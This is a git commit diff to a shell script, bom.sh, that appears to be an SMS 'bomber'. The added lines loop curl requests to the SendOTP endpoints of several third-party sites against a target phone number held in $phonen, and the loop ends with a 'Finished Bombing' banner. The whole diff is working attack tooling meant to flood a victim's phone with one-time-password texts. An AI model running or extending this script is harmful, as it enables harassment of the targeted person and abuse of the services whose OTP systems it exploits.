581fb95485afb5319889f172d7dc72b14ac4e4ef
apa-richit <57231457+apa-richit@users.noreply.github.com>
2019-10-31 23:04:11 +0530

    Url Updated
    Added more urls

--- bom.sh
+++ bom.sh
@@ -31,5 +31,10 @@ curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" -
 sleep del
 curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --cookie "__cfduid=d1d4ecdbd06a0ff1d9f9bb49a7437e1971552854291; _fbp=fb.1.1552843496379.413177475; _ga=GA1.2.588183707.1552843499; ASPSESSIONIDQQQRTRSR=DOOJLNKAENEKGABNLIPCAMFH" --url "http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen"
 sleep del
+curl http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phonen
+curl http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen
+curl http://52redpoker.com/SendOTP.asp?For=Phone&PhoneNo=$phonen
+curl http://52redrummy.com/SendOTP.asp?For=Phone&PhoneNo=$phonen
+curl http://pokerraj.com/SendOTP.asp?For=Phone&PhoneNo=$phonen
 done
 banner "Finished Bombing"
